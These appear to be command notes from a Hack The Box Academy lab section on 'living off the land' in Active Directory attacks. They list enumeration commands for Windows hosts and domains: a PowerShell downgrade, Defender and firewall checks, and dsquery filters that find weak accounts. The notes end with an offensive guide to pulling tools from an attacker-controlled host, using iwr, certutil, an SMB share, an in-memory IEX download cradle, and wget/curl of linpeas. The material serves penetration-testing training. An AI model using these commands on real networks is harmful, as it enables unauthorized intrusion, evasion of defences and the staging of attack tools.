# Section 16: Living Off the Land

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1360
- Code/command blocks: 16

> Terminal output is omitted; only commands & scripts are captured.

```powershell
Get-Module
Get-ExecutionPolicy -List
whoami
Get-ChildItem Env: | ft key,value
```

```powershell
Get-host
powershell.exe -version 2
Get-host
get-module
```

```powershell
netsh advfirewall show allprofiles
```

```cmd
sc query windefend
```

```powershell
Get-MpComputerStatus
```

```powershell
qwinsta
```

```powershell
arp -a
```

```powershell
route print
```

```powershell
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

```powershell
net group /domain
```

```powershell
net user /domain wrouse
```

```powershell
dsquery user
```

```powershell
dsquery computer
```

```powershell
dsquery * "CN=Users,DC={{DOMAIN_NB}},DC=LOCAL"
```

```powershell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

```powershell
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

## Getting tools onto a box (HTTP / SMB pull)

> `{{LHOST}}` = your attack box IP. Host the file once on Kali, then pull with a one-liner on each box instead of copying manually.

### Serve from your attack box (Kali)

```bash
# HTTP
python3 -m http.server 80
```

```bash
# SMB (Impacket) — share name "share", current dir
impacket-smbserver share . -smb2support
```

### Pull onto a Windows target

```powershell
# PowerShell download
iwr http://{{LHOST}}/Inveigh.exe -OutFile C:\Windows\Temp\Inveigh.exe
```

```cmd
:: certutil LOLBIN
certutil -urlcache -f http://{{LHOST}}/Inveigh.exe Inveigh.exe
```

```powershell
# Run straight from the SMB share (no local copy)
\\{{LHOST}}\share\Inveigh.exe
```

```powershell
# In-memory, never touches disk (download cradle)
IEX(New-Object Net.WebClient).DownloadString('http://{{LHOST}}/script.ps1')
```

### Pull onto a Linux target

```bash
wget http://{{LHOST}}/linpeas.sh -O /tmp/linpeas.sh
curl http://{{LHOST}}/linpeas.sh -o /tmp/linpeas.sh
```

